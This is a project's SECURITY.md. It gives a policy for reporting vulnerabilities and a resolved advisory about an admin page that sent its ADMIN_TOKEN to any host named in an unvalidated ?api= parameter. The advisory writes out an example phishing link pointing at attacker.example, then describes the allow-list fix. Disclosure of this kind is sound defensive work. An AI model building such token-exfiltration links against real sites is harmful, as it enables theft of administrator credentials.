# Security Policy

## Reporting a vulnerability

OpenStore has no bug bounty program, but genuine reports are welcome and taken seriously.
Please reach the project owner via [GitHub](https://github.com/Josequevedov08) rather than
opening a public issue for anything that could be actively exploited before a fix ships.
Include: what you found, how to reproduce it, and its impact. A fix and a note here typically
follow within a few days for this project's scope.

## Resolved issues

### 2026-09-03 — Admin panel token-exfiltration via unvalidated `?api=` parameter

**Severity:** High (credential exfiltration via phishing link).
**Component:** `frontend/public/admin.html`.
**Reported by:** the project owner, while reviewing the admin panel.

**Issue:** `admin.html` read its backend URL from its own `?api=` query-string parameter with
no validation, then sent the operator's `ADMIN_TOKEN` to whatever host that parameter named —
and persisted that host to `localStorage` for future visits. A link built as
`https://<real-vercel-domain>/admin.html?api=https://attacker.example` carried a genuine
domain and a valid padlock; nothing in the address bar would tip off the person clicking it.
The moment the operator typed their token into the form on that page and submitted it, the
token was sent straight to the attacker's server — no exploit of the backend or of Vercel was
needed, because the page's own client-side logic did the exfiltration.

**Fix:** `?api=` (and anything already saved in `localStorage`) is now checked against a strict
allow-list — the production backend's own origin, or `localhost` for local development only.
Any other value is ignored outright and never written to storage, including a previously-saved
value that stops passing the check on a later visit. Verified by reproducing the exact attack
against the running page: the malicious host is discarded and the token is sent only to the
real backend.

**Lesson:** a URL query parameter must never be trusted to decide where a secret gets sent.
Any admin or credential-bearing page needs to validate destination origins against a hardcoded
allow-list — otherwise a link that *looks* legitimate (same real domain, valid certificate)
can turn the page itself into the phishing delivery mechanism, with persistence in
`localStorage` extending the exposure beyond the first click. See
[`CHANGELOG.md`](CHANGELOG.md) for the full commit-level detail, and Section 9 of the project
documentation (`docs/OpenStore-Documentation-EN.pdf` / `docs/OpenStore-Documentacion-ES.pdf`)
for how this fits alongside the project's other lessons learned.
